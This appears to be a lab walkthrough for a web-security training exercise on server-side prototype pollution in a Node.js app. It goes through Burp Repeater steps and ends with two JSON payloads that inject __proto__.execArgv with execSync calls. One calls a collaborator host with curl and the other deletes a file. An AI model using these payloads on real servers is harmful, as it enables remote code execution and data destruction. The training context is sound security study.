
1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
    
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
    
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
    
4. Send the request to Burp Repeater.

5. Add the following to the JSON data;

![](Pasted_image_20231210182452.png)

6. Run the job;

![](Pasted_image_20231210182529.png)

7. Add the following payload to update address;

![](Pasted_image_20231210184159.png)

8. Run the jobs again and verify the interaction;

![](Pasted_image_20231210184250.png)

9. Remove carlos data;

![](Pasted_image_20231210184351.png)


10. Run the jobs again and solve the lab;

![](Pasted_image_20231210184441.png)

```json

"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }

```


```json
"__proto__": {
    "execArgv":[                       
            
         
 "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

